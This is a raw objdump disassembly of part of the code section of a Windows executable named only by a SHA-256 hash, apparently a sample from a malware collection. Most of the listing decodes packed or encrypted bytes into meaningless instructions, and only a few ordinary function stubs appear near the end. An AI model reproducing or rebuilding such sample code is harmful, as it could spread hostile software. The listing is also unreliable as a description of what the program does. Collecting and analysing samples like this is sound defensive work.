
15c1e1189bcc58e3223c068a1d7810b1ba316aab324f8e216a9ef796572c6562.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	lods   eax,DWORD PTR ds:[esi]
  4d0001:	or     al,0x25
  4d0003:	popf   
  4d0004:	imul   ecx,DWORD PTR [eax-0x51],0xe4267277
  4d000b:	dec    edi
  4d000c:	adc    BYTE PTR [ecx+esi*8+0x12],dh
  4d0010:	arpl   WORD PTR [edi+esi*2+0x5b],si
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d073e
  4d06c1:	outs   dx,DWORD PTR ds:[esi]
  4d06c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d06c3:	retf   0xf79a
  4d06c6:	outs   dx,DWORD PTR ds:[esi]
  4d06c7:	add    edx,ebx
  4d06c9:	ficomp DWORD PTR [esp+ebp*2]
  4d06cc:	push   ebx
  4d06cd:	push   edi
  4d06ce:	(bad)  
  4d06d0:	adc    bh,dl
  4d06d2:	inc    edx
  4d06d3:	jecxz  0x4d0734
  4d06d5:	inc    ebp
  4d06d6:	(bad)  
  4d06d7:	pop    ds
  4d06d8:	gs pop edi
  4d06da:	lea    edi,[esi-0x3131dba4]
  4d06e0:	xor    edi,ecx
  4d06e2:	fsub   st(2),st
  4d06e4:	lock leave 
  4d06e6:	lahf   
  4d06e7:	sub    eax,DWORD PTR [edi-0x74d7fe68]
  4d06ed:	call   DWORD PTR [ebp-0x75]
  4d06f0:	in     al,dx
  4d06f1:	sub    esp,0x60
  4d06f4:	mov    ebx,0x4d3080
  4d06f9:	cmp    ebx,0x4be4
  4d06ff:	jbe    0x4d06ef
  4d0701:	push   ebx
  4d0702:	push   DWORD PTR [ebx+0x134]
  4d0708:	push   DWORD PTR [ebx+0x88]
  4d070e:	call   0x4d1528
  4d0713:	add    esp,0x8
  4d0716:	pop    ebx
  4d0717:	call   0x4d0ea8
  4d071c:	add    esp,0x4
  4d071f:	mov    esi,0x0
  4d0724:	push   esi
  4d0725:	call   0x4d1164
  4d072a:	add    esp,0x4
  4d072d:	add    esp,0x60
  4d0730:	pop    ebp
  4d0731:	ret    
  4d0732:	add    BYTE PTR [eax],al
  4d0734:	pop    edi
  4d0735:	call   DWORD PTR ds:0x4d2018
  4d073b:	call   edi
  4d073d:	add    BYTE PTR [eax],al
  4d073f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0745:	sub    esp,0x24
  4d0748:	mov    ecx,0x4d3004
  4d074d:	adc    DWORD PTR [ecx+0xc0],0x53e3
  4d0757:	push   ecx
  4d0758:	push   0x0
  4d075a:	call   0x4d1490
  4d075f:	add    esp,0x4
  4d0762:	pop    ecx
  4d0763:	push   ecx
  4d0764:	push   DWORD PTR [ecx+0x184]
  4d076a:	push   DWORD PTR [ecx+0x88]
  4d0770:	push   DWORD PTR [ecx+0x174]
  4d0776:	call   0x4d1048
  4d077b:	add    esp,0xc
  4d077e:	pop    ecx
  4d077f:	push   ecx
  4d0780:	push   0xfffffff4
  4d0782:	call   0x4d0e48
  4d0787:	add    esp,0x4
  4d078a:	pop    ecx
  4d078b:	add    esp,0x24
  4d078e:	pop    ebp
  4d078f:	ret    
  4d0790:	mov    edi,edi
  4d0792:	push   ebp
  4d0793:	mov    ebp,esp
  4d0795:	sub    esp,0x28
  4d0798:	lea    esi,ds:0x4d31ec
